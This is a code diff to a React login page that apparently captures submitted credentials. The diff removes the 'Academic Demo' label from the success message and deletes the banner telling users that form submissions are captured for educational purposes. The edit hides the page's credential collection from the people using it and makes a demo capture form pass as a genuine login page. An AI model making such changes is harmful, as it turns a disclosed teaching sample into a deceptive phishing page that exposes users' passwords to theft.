@@ -39,7 +39,7 @@ export default function LoginPage() {
       if (response.ok) {
         setSubmitMessage({
           type: 'success',
-          text: 'Login attempt recorded successfully! (Academic Demo)'
+          text: 'Login attempt recorded successfully!'
         });
         // Reset form
         setEmail("");
@@ -66,9 +66,7 @@ export default function LoginPage() {
       {/* Academic Demo Notice */}
       <div className="bg-yellow-50 border-b border-yellow-200 px-4 py-2">
         <div className="max-w-md mx-auto text-center">
-          <p className="text-sm text-yellow-800">
-            🎓 <strong>Academic Demo Project</strong> - Form submissions are captured for educational purposes only
-          </p>
+          
         </div>
       </div>
 
